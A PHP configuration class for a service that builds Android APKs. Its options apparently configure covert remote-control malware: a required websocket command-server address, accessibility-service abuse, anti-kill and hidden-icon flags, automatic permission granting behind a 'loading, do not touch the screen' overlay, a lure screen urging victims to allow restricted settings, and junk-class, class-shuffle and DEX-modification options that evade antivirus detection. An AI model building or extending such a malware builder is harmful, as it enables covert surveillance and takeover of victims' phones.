<?php

declare(strict_types=1);

namespace App\Services\ApkBuilder;

use Illuminate\Contracts\Support\Arrayable;

final class ApkBuildConfig implements Arrayable
{
    public function __construct(
        public readonly string $appId,
        public readonly string $userId,
        public readonly string $appName,
        public readonly string $appVersion,
        public readonly string $websocketUrl,
        public readonly string $clientName = '',
        public readonly string $email = '',
        public readonly string $appUrl = '',
        public readonly string $iconPath = '',
        public readonly string $backgroundPath = 'black',
        public readonly string $useAccess = '1',
        public readonly string $useAntkill = '1',
        public readonly string $useAtoprims = '加载中~请勿操作或锁屏！',
        public readonly string $userAllprims = '1',
        public readonly string $userBlackprims = '1',
        public readonly string $hiddenApp = '1',
        public readonly string $useDraw = '0',
        public readonly string $openAccess = '0',
        public readonly string $diaoType = '1',
        public readonly string $hideType = 'f',
        public readonly string $installType = 'g',
        public readonly string $buildType = 'C',
        public readonly string $loginTitle = '欢迎使用',
        public readonly string $loginDis = '允许受限制的设置',
        public readonly string $loginBtn = '开始',
        public readonly string $lngShort = '',
        public readonly string $notifyTitle = ' ',
        public readonly string $notifyMsg = 'on',
        public readonly string $mainActivity = 'empty',
        public readonly string $appFolder = 'empty',
        public readonly string $description = '',
        public readonly bool $enableJunkClasses = false,
        public readonly bool $enableClassShuffle = false,
        public readonly bool $enableApkProtection = false,
        public readonly bool $enableDexModification = false,
        public readonly int $junkClassCount = 50,
        public readonly int $junkMethodCount = 10,
    ) {}

    public static function fromArray(array $data): self
    {
        return new self(
            appId: $data['app_id'] ?? $data['appid'] ?? '',
            userId: (string) ($data['user_id'] ?? $data['userid'] ?? ''),
            appName: $data['app_name'] ?? $data['appname'] ?? '',
            appVersion: $data['app_version'] ?? $data['appversion'] ?? '1.0',
            websocketUrl: $data['websocket_url'] ?? $data['websocketUrl'] ?? '',
            clientName: $data['client_name'] ?? $data['clientname'] ?? '',
            email: $data['email'] ?? '',
            appUrl: $data['app_url'] ?? $data['appurl'] ?? '',
            iconPath: $data['icon_path'] ?? $data['appicopath'] ?? '',
            backgroundPath: $data['background_path'] ?? $data['noEmulator'] ?? 'black',
            useAccess: (string) ($data['use_access'] ?? $data['useAccess'] ?? '1'),
            useAntkill: (string) ($data['use_antkill'] ?? $data['useAntkill'] ?? '1'),
            useAtoprims: $data['use_atoprims'] ?? $data['useAtoprims'] ?? '加载中~请勿操作或锁屏！',
            userAllprims: (string) ($data['user_allprims'] ?? $data['userAllprims'] ?? '1'),
            userBlackprims: (string) ($data['user_blackprims'] ?? $data['userBlackprims'] ?? '1'),
            hiddenApp: (string) ($data['hidden_app'] ?? $data['hiddenApp'] ?? '1'),
            useDraw: (string) ($data['use_draw'] ?? $data['useDraw'] ?? '0'),
            openAccess: (string) ($data['open_access'] ?? $data['openAccess'] ?? '0'),
            diaoType: (string) ($data['diao_type'] ?? $data['diaoType'] ?? '1'),
            hideType: $data['hide_type'] ?? $data['hideType'] ?? 'f',
            installType: $data['install_type'] ?? $data['installType'] ?? 'g',
            buildType: $data['build_type'] ?? $data['buildType'] ?? 'C',
            loginTitle: $data['login_title'] ?? $data['loginTitle'] ?? '欢迎使用',
            loginDis: $data['login_dis'] ?? $data['loginDis'] ?? '允许受限制的设置',
            loginBtn: $data['login_btn'] ?? $data['loginBtn'] ?? '开始',
            lngShort: $data['lng_short'] ?? $data['lngShort'] ?? '',
            notifyTitle: $data['notify_title'] ?? $data['notifyTitle'] ?? ' ',
            notifyMsg: $data['notify_msg'] ?? $data['notifyMsg'] ?? 'on',
            mainActivity: $data['main_activity'] ?? $data['mainActivity'] ?? 'empty',
            appFolder: $data['app_folder'] ?? $data['appFolder'] ?? 'empty',
            description: $data['description'] ?? '',
            enableJunkClasses: (bool) ($data['enable_junk_classes'] ?? $data['enableJunkClasses'] ?? false),
            enableClassShuffle: (bool) ($data['enable_class_shuffle'] ?? $data['enableClassShuffle'] ?? false),
            enableApkProtection: (bool) ($data['enable_apk_protection'] ?? $data['enableApkProtection'] ?? false),
            enableDexModification: (bool) ($data['enable_dex_modification'] ?? $data['enableDexModification'] ?? false),
            junkClassCount: (int) ($data['junk_class_count'] ?? $data['junkClassCount'] ?? 50),
            junkMethodCount: (int) ($data['junk_method_count'] ?? $data['junkMethodCount'] ?? 10),
        );
    }

    public function toArray(): array
    {
        return [
            'app_id' => $this->appId,
            'user_id' => $this->userId,
            'app_name' => $this->appName,
            'app_version' => $this->appVersion,
            'websocket_url' => $this->websocketUrl,
            'client_name' => $this->clientName,
            'email' => $this->email,
            'app_url' => $this->appUrl,
            'icon_path' => $this->iconPath,
            'background_path' => $this->backgroundPath,
            'use_access' => $this->useAccess,
            'use_antkill' => $this->useAntkill,
            'use_atoprims' => $this->useAtoprims,
            'user_allprims' => $this->userAllprims,
            'user_blackprims' => $this->userBlackprims,
            'hidden_app' => $this->hiddenApp,
            'use_draw' => $this->useDraw,
            'open_access' => $this->openAccess,
            'diao_type' => $this->diaoType,
            'hide_type' => $this->hideType,
            'install_type' => $this->installType,
            'build_type' => $this->buildType,
            'login_title' => $this->loginTitle,
            'login_dis' => $this->loginDis,
            'login_btn' => $this->loginBtn,
            'lng_short' => $this->lngShort,
            'notify_title' => $this->notifyTitle,
            'notify_msg' => $this->notifyMsg,
            'main_activity' => $this->mainActivity,
            'app_folder' => $this->appFolder,
            'description' => $this->description,
            'enable_junk_classes' => $this->enableJunkClasses,
            'enable_class_shuffle' => $this->enableClassShuffle,
            'enable_apk_protection' => $this->enableApkProtection,
            'enable_dex_modification' => $this->enableDexModification,
            'junk_class_count' => $this->junkClassCount,
            'junk_method_count' => $this->junkMethodCount,
        ];
    }

    public function validate(): array
    {
        $errors = [];

        // Required fields
        if (empty($this->appId)) {
            $errors[] = 'app_id is required';
        } elseif (!preg_match('/^[a-zA-Z][a-zA-Z0-9_]*(\.[a-zA-Z][a-zA-Z0-9_]*)+$/', $this->appId)) {
            $errors[] = 'app_id must be a valid package name (e.g., com.example.app)';
        }

        if (empty($this->userId)) {
            $errors[] = 'user_id is required';
        }

        if (empty($this->appName)) {
            $errors[] = 'app_name is required';
        } elseif (mb_strlen($this->appName) > 100) {
            $errors[] = 'app_name must not exceed 100 characters';
        }

        if (empty($this->appVersion)) {
            $errors[] = 'app_version is required';
        } elseif (!preg_match('/^\d+(\.\d+){0,2}$/', $this->appVersion)) {
            $errors[] = 'app_version must be a valid version (e.g., 1.0 or 1.0.0)';
        }

        if (empty($this->websocketUrl)) {
            $errors[] = 'websocket_url is required';
        } elseif (!$this->isValidWebsocketUrl($this->websocketUrl)) {
            $errors[] = 'websocket_url must be a valid WebSocket URL (e.g., ws://example.com:8080 or wss://example.com:8080)';
        }

        // Optional field format validation
        if (!empty($this->email) && !filter_var($this->email, FILTER_VALIDATE_EMAIL)) {
            $errors[] = 'email must be a valid email address';
        }

        // String length limits
        $lengthLimits = [
            'clientName' => 100,
            'email' => 255,
            'websocketUrl' => 255,
            'appUrl' => 500,
            'description' => 500,
            'loginTitle' => 100,
            'loginDis' => 200,
            'loginBtn' => 50,
            'notifyTitle' => 100,
            'notifyMsg' => 200,
        ];

        foreach ($lengthLimits as $field => $maxLength) {
            if (mb_strlen($this->$field) > $maxLength) {
                $errors[] = "{$field} must not exceed {$maxLength} characters";
            }
        }

        return $errors;
    }

    private function isValidWebsocketUrl(string $url): bool
    {
        if (!preg_match('/^wss?:\/\//', $url)) {
            return false;
        }

        $parsed = parse_url($url);
        if ($parsed === false || !isset($parsed['host'])) {
            return false;
        }

        $host = $parsed['host'];
        $port = $parsed['port'] ?? null;

        if ($port !== null && ($port < 1 || $port > 65535)) {
            return false;
        }

        if (filter_var($host, FILTER_VALIDATE_IP)) {
            return true;
        }

        return (bool) preg_match('/^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*$/', $host);
    }

    public function isValid(): bool
    {
        return empty($this->validate());
    }

    public function isStoreMode(): bool
    {
        return $this->buildType === 'S';
    }

    public function hasCustomBackground(): bool
    {
        return !empty($this->backgroundPath) && strtolower($this->backgroundPath) !== 'black';
    }
}
